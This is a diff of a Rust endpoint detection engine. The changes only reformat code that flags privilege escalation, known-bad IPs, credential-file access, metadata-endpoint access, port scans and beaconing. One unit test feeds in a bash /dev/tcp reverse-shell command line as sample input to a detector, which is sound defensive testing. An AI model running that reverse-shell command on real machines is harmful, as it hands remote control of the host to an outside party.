@@ -40,7 +40,7 @@ use std::time::Instant;
 use tracing::{info, warn};
 
 use crate::schema::{
-    AgentEvent, DetectionData, EventAction, EventClass, EventData, Severity, SetuidData,
+    AgentEvent, DetectionData, EventAction, EventClass, EventData, SetuidData, Severity,
 };
 
 pub use ioc::IocSet;
@@ -132,7 +132,11 @@ impl DetectionEngine {
             }
             let added = dynamic.len();
             engine.extend(dynamic);
-            info!(backend_rules = added, total = engine.len(), "Sigma: ruleset reloaded from config");
+            info!(
+                backend_rules = added,
+                total = engine.len(),
+                "Sigma: ruleset reloaded from config"
+            );
         }
         match self.sigma.write() {
             Ok(mut g) => *g = engine,
@@ -181,10 +185,22 @@ impl DetectionEngine {
         let mut out = Vec::new();
         match &event.data {
             EventData::ProcessCreate(p) => {
-                self.inspect_process(&p.name, &p.exe, &p.cmdline, p.exe_sha256.as_deref(), &mut out);
+                self.inspect_process(
+                    &p.name,
+                    &p.exe,
+                    &p.cmdline,
+                    p.exe_sha256.as_deref(),
+                    &mut out,
+                );
             }
             EventData::ProcessExec(p) => {
-                self.inspect_process(&p.comm, &p.exe, &p.cmdline, p.exe_sha256.as_deref(), &mut out);
+                self.inspect_process(
+                    &p.comm,
+                    &p.exe,
+                    &p.cmdline,
+                    p.exe_sha256.as_deref(),
+                    &mut out,
+                );
                 if let Some(ref ld_preload) = p.ld_preload {
                     if let Some(d) = behavior::inspect_ld_preload(&p.comm, &p.exe, ld_preload) {
                         let sev = severity_for(d.confidence);
@@ -193,7 +209,10 @@ impl DetectionEngine {
                 }
                 // Statistical behavioural baseline (config-gated): per-user
                 // binary novelty + exec-rate z-score, learned online.
-                if self.anomaly_enabled.load(std::sync::atomic::Ordering::Relaxed) {
+                if self
+                    .anomaly_enabled
+                    .load(std::sync::atomic::Ordering::Relaxed)
+                {
                     if let Ok(mut b) = self.baseline.lock() {
                         if let Some(d) = b.observe_exec(&p.username, &p.exe, Instant::now()) {
                             let sev = severity_for(d.confidence);
@@ -301,14 +320,14 @@ impl DetectionEngine {
             out.push(self.detection(
                 Severity::High,
                 DetectionData {
-                    rule_id:         "privesc.setuid_root".into(),
-                    title:           "Privilege escalation via setuid(0)".into(),
-                    category:        "privilege_escalation".into(),
-                    mitre_tactic:    Some("TA0004 Privilege Escalation".into()),
+                    rule_id: "privesc.setuid_root".into(),
+                    title: "Privilege escalation via setuid(0)".into(),
+                    category: "privilege_escalation".into(),
+                    mitre_tactic: Some("TA0004 Privilege Escalation".into()),
                     mitre_technique: Some("T1548.001".into()),
-                    confidence:      90,
-                    subject:         s.comm.clone(),
-                    detail:          format!(
+                    confidence: 90,
+                    subject: s.comm.clone(),
+                    detail: format!(
                         "PID {} ({}) set effective UID to 0 (was UID {})",
                         s.pid, s.comm, s.old_uid
                     ),
@@ -325,7 +344,11 @@ impl DetectionEngine {
 
     fn inspect_network(&self, dst_addr: &str, dst_port: u16, out: &mut Vec<AgentEvent>) {
         // IOC: known-bad destination IP.
-        let ip_hit = self.iocs.read().map(|i| i.match_ip(dst_addr)).unwrap_or(false);
+        let ip_hit = self
+            .iocs
+            .read()
+            .map(|i| i.match_ip(dst_addr))
+            .unwrap_or(false);
         if ip_hit {
             out.push(self.detection(
                 Severity::Critical,
@@ -440,7 +463,8 @@ impl DetectionEngine {
     fn inspect_file_open(&self, path: &str, comm: &str, out: &mut Vec<AgentEvent>) {
         // Sensitive credential-store access (logic + lists live in the
         // filesystem collector, mirroring how `behavior` owns its heuristics).
-        if let Some(d) = crate::collectors::linux::filesystem::inspect_sensitive_access(path, comm) {
+        if let Some(d) = crate::collectors::linux::filesystem::inspect_sensitive_access(path, comm)
+        {
             let sev = severity_for(d.confidence);
             out.push(self.detection(sev, d));
         }
@@ -569,7 +593,13 @@ fn sigma_detection(rule: &sigma::CompiledRule, view: &sigma::fields::FieldView) 
 /// Lower-case, dash-separated slug of a rule title for a stable rule_id.
 fn slugify(s: &str) -> String {
     s.chars()
-        .map(|c| if c.is_ascii_alphanumeric() { c.to_ascii_lowercase() } else { '-' })
+        .map(|c| {
+            if c.is_ascii_alphanumeric() {
+                c.to_ascii_lowercase()
+            } else {
+                '-'
+            }
+        })
         .collect::<String>()
         .split('-')
         .filter(|p| !p.is_empty())
@@ -673,7 +703,11 @@ mod tests {
     #[test]
     fn flags_reverse_shell_process() {
         let e = engine();
-        let out = e.inspect(&proc_event("bash", "/bin/bash", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"));
+        let out = e.inspect(&proc_event(
+            "bash",
+            "/bin/bash",
+            "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
+        ));
         assert_eq!(out.len(), 1);
         assert!(matches!(out[0].class, EventClass::Detection));
     }
@@ -682,7 +716,9 @@ mod tests {
     fn flags_ioc_ip() {
         let e = engine();
         let out = e.inspect(&net_event("203.0.113.5", 443));
-        assert!(out.iter().any(|ev| matches!(&ev.data, EventData::Detection(d) if d.category == "ioc")));
+        assert!(out
+            .iter()
+            .any(|ev| matches!(&ev.data, EventData::Detection(d) if d.category == "ioc")));
     }
 
     #[test]
@@ -721,7 +757,9 @@ mod tests {
         );
         let out = e.inspect(&ev);
         assert!(
-            out.iter().any(|d| matches!(&d.data, EventData::Detection(dd) if dd.rule_id == "ioc.process_hash")),
+            out.iter().any(
+                |d| matches!(&d.data, EventData::Detection(dd) if dd.rule_id == "ioc.process_hash")
+            ),
             "a known-bad exe hash should fire ioc.process_hash"
         );
     }
@@ -738,7 +776,9 @@ mod tests {
         let e = engine();
         let out = e.inspect(&net_event("169.254.169.254", 80));
         assert!(
-            out.iter().any(|ev| matches!(&ev.data, EventData::Detection(d) if d.rule_id == "cloud.imds_access")),
+            out.iter().any(
+                |ev| matches!(&ev.data, EventData::Detection(d) if d.rule_id == "cloud.imds_access")
+            ),
             "connection to the cloud metadata endpoint should be flagged"
         );
     }
@@ -748,10 +788,9 @@ mod tests {
         let e = engine();
         let mut hit = false;
         for port in 1000..=1020u16 {
-            if e.inspect(&net_event("198.51.100.50", port))
-                .iter()
-                .any(|ev| matches!(&ev.data, EventData::Detection(d) if d.rule_id == "recon.port_scan"))
-            {
+            if e.inspect(&net_event("198.51.100.50", port)).iter().any(
+                |ev| matches!(&ev.data, EventData::Detection(d) if d.rule_id == "recon.port_scan"),
+            ) {
                 hit = true;
             }
         }
@@ -789,6 +828,9 @@ mod tests {
                 hit = true;
             }
         }
-        assert!(hit, "expected a beaconing verdict for a regular 60s cadence");
+        assert!(
+            hit,
+            "expected a beaconing verdict for a regular 60s cadence"
+        );
     }
 }
